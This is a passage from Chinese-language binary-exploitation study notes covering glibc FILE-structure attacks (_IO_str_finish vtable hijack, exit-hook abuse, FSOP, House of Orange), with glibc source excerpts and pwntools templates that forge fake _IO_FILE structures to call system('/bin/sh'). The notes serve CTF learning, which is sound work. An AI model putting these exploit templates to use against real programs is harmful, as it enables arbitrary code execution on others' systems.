</span></span><span class=line><span class=cl>  <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>_IO_default_finish</span> <span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><ul><li>对<code>fp</code>被强制转换为的<code>_IO_strfile *</code>类型分析</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_IO_strfile_</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>_IO_streambuf</span> <span class=n>_sbf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>_IO_str_fields</span> <span class=n>_s</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>_IO_strfile</span><span class=p>;</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>_IO_streambuf</span> <span class=c1>// 实际就是_IO_FILE_plus
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>_IO_FILE</span> <span class=n>_f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=k>struct</span> <span class=n>_IO_jump_t</span> <span class=o>*</span><span class=n>vtable</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>_IO_str_fields</span> <span class=c1>// 类似继承增加了一段区域
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>_IO_alloc_type</span> <span class=n>_allocate_buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_IO_free_type</span> <span class=n>_free_buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><p><strong>利用</strong></p><ul><li><strong>触发</strong>：需要劫持 vtable 指向某处，使得下一个调用的 vtable 中函数位置错位为<code>_IO_str_finish</code></li><li><code>printf</code>函数会调用<code>_IO_new_file_xsputn</code>，将 vtable 指向<code>&_IO_str_jumps - 0x28</code>位置，如下图</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250120214839473.png alt=图片无法加载><p><strong>模板</strong></p><ul><li>构造一块伪造块，若为 chunk 则 prev_size 与 size 无法劫持</li><li>large bin attack 修改 bk*nextsize 为<code>libc.sym["\_IO_2_1_stdout*"]-0x20</code>劫持 stdout 结构体为 fake_file</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># _flags, (0xFBAD2887 &amp; (~0x1)) 清除_IO_USER_BUF绕过_IO_str_finish检查</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFBAD2886</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>131</span><span class=p>)</span> <span class=o>*</span> <span class=mi>6</span>  <span class=c1># _IO_read_ptr到_IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>  <span class=c1># _IO_buf_base -&gt; &#34;/bin/sh&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>132</span><span class=p>)</span>  <span class=c1># _IO_buf_end:(_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdin_&#39;</span><span class=p>])</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># _fileno for stdout is 1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1e20</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0xe20</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># 调整vtable</span>
</span></span><span class=line><span class=cl><span class=c1># vtable设置为_IO_str_jumps - 0x28，设置_IO_2_1_stdout_ + 0xe8为one_gadget</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_str_jumps_addr</span> <span class=o>-</span> <span class=mh>0x28</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span></span></span></code></pre></div></div><p>libc-2.28 起<code>_IO_str_finish</code>不再调用<code>_free_buffer</code>而直接调用<code>free</code>，方法失效</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>_IO_str_finish</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span><span class=p>,</span> <span class=kt>int</span> <span class=n>dummy</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_flags</span> <span class=o>&amp;</span> <span class=n>_IO_USER_BUF</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>_IO_default_finish</span> <span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>② 直接利用 IO_validate_vtable</p><p><strong>调用链</strong>：</p><ul><li><code>IO_validate_vtable</code> -> <code>_IO_vtable_check</code></li><li>若<code>rtld_active</code>返回真，将执行<code>(_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0</code></li><li>执行<code>__rtld_lock_lock_recursive(GL(dl_load_lock));</code>该宏为 exit hook 对应的宏</li><li>修改函数指针劫持程序流</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    # define __rtld_lock_lock_recursive(NAME) \
</span></span></span><span class=line><span class=cl><span class=cm>      __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)
</span></span></span><span class=line><span class=cl><span class=cm>     替换:
</span></span></span><span class=line><span class=cl><span class=cm>    (({
</span></span></span><span class=line><span class=cl><span class=cm>        __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);
</span></span></span><span class=line><span class=cl><span class=cm>        _fn != ((void *) 0) ? (*_fn)(&amp;(_dl_load_lock).mutex) : 0;
</span></span></span><span class=line><span class=cl><span class=cm>    }))
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=nf>__rtld_lock_lock_recursive</span><span class=p>(</span><span class=nf>GL</span><span class=p>(</span><span class=n>dl_load_lock</span><span class=p>));</span></span></span></code></pre></div></div><p><strong>利用</strong></p><ul><li><p>仅利用 tcache bin attack 可完成攻击</p></li><li><p>需要 2 次任意地址写，向<code>exit-hook</code>地址写<code>system</code>，向<code>exit-hook-arg</code>参数写<code>'/bin/sh'</code></p></li><li><p><code>u _dl_addr</code>获取到汇编</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>mov r15, qword ptr [rip + 0x882e3] ; r15 &lt;-- (_rtld_local)
mov qword ptr [rsp + 8], rcx
lea rdi, [r15 + 0x988] ; rdi: 即 exit-hook 参数
call qword ptr [r15 + 0xf90] ; call (rtld_lock_default_lock_recursive) 即exit-hook</code></pre></div><ul><li>将 vtable 指针改坏，可利用 malloc<code>tcache_get</code>自动将 key 设置为 0 来劫持 vtable 为 0，触发 exit-hook</li></ul><p>glibc-2.34 后失效，无法利用 exit-hook</p><h3 id=fsop>FSOP</h3><ul><li>File Stream Oriented Programming，需泄露 libc 基址和堆地址</li><li>劫持<code>_IO_list_all</code>指向伪造的<code>_IO_FILE_plus</code></li><li>最终程序【执行<code>exit</code>函数】或【libc 执行<code>abort</code>流程】或【执行流从 main 函数返回】时，会执行<code>_IO_flush_all_lockp</code>函数</li><li>该函数会刷新<code>_IO_list_all</code>链表中所有项的文件流，即对每个 FILE 调用 fflush，对应会调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code></li></ul><p><strong>劫持_IO_list_all</strong></p><ol><li>修改<code>IO_FILE</code>结构体，选择<code>_IO_2_1_stderr</code>结构体不影响 IO</li><li>利用 large bin attack 将 <code>_IO_list_all</code>覆盖成一个 chunk 地址，申请出来后伪造 IO_FILE 结构体</li></ol><p><strong>原理</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(((</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)</span> <span class=o>||</span> <span class=p>...)</span>
</span></span><span class=line><span class=cl>    <span class=o>&amp;&amp;</span> <span class=nf>_IO_OVERFLOW</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>EOF</span><span class=p>)</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span></span></span></code></pre></div></div><p>需要满足条件：<code>fp->_mode &lt;= 0</code>以及<code>fp->_IO_write_ptr > fp->_IO_write_base</code></p><p><strong>利用</strong></p><ul><li>将 vtable 伪造在 <code>_IO_2_1_stderr + 0x10</code> 处使得<code>_IO_2_1_stderr</code>的<code>fp->_IO_write_ptr</code>恰好对应于<code>vtable</code>的<code>_IO_overflow</code></li><li>将<code>fp->_IO_write_ptr</code>写入<code>system</code>函数地址，<code>_IO_overflow</code>传参为<code>_IO_2_1_stderr</code>结构体，将该结构体起始位置写入<code>/bin/sh</code></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250111200739846.png alt=图片无法加载><p><strong>模板</strong></p><p>其中，编辑不了 chunk 的 prev_size，可以借助前一个 chunk 编辑复用更改该 chunk 的 prev_size</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _flags, an magic number</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_ptr</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>])</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x160</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable 填充需要注意调试修改</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stderr_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span>  <span class=c1># fake vtable 需将该处更换为伪造的 fake chunk地址+0x10</span></span></span></code></pre></div></div><p>退出程序触发 FSOP</p><h3 id=house-of-1>House of</h3><h4 id=house-of-orange>House of Orange</h4><ul><li>glibc-2.23~2.26，无 free 函数，仅存在堆溢出，可以 unsorted bin attack</li><li>释放到 largebin 可泄露(fd,bk)libc 基址和(fd_nextsize,bk_nextsize)堆地址，申请一个小堆块，切割后剩余 chunk 从 lage bin 进入 unsorted bin</li><li>申请的<code>nb&lt;0x20000</code></li></ul><p>利用包括<strong>2</strong>部分</p><ol><li>无 free 情况下得到一个位于 unsorted bin 中的 chunk</li><li>unsorted bin attack 劫持 <code>_IO_list_all</code> 实现 FSOP</li></ol><h5 id=step-1>Step 1</h5><p>若当前堆的 top chunk 尺寸不足以满足申请分配的大小时，原来 top chunk 会被释放置入 unsorted bin 中</p><p><strong>利用流程</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 调用链: malloc &gt; sysmalloc &gt; _int_free
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>_int_free</span><span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>old_top</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// 通过此将top chunk free
</span></span></span></code></pre></div></div><ul><li>执行<code>sysmalloc</code>向系统申请内存有 mmap 和 brk，该处需要以 brk 形式拓展，需要 malloc 尺寸小于<code>mp_.mmap_threshold</code>绕过 mmap</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>av</span> <span class=o>==</span> <span class=nb>NULL</span> <span class=o>||</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>nb</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>mp_</span><span class=p>.</span><span class=n>n_mmaps</span> <span class=o>&lt;</span> <span class=n>mp_</span><span class=p>.</span><span class=n>n_mmaps_max</span><span class=p>))){</span>
</span></span><span class=line><span class=cl>	<span class=p>...</span>
</span></span><span class=line><span class=cl>	<span class=nl>try_mmap</span><span class=p>:</span> <span class=c1>// 使用mmap
</span></span></span></code></pre></div></div><ul><li>有 arena 则有 top chunk，需要扩展 top chunk 堆段，切割内存返回，调用 brk 前需要绕过检查</li><li>绕过：<strong>伪造 size 时原 top chunk 结束位置必须对齐内存页 4K，MINSIZE(0x10)&lt;size&lt;nb+MINSIZE，size 的 prev_inuse 位置 1</strong></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>old_top</span> <span class=o>=</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>top</span><span class=p>;</span>
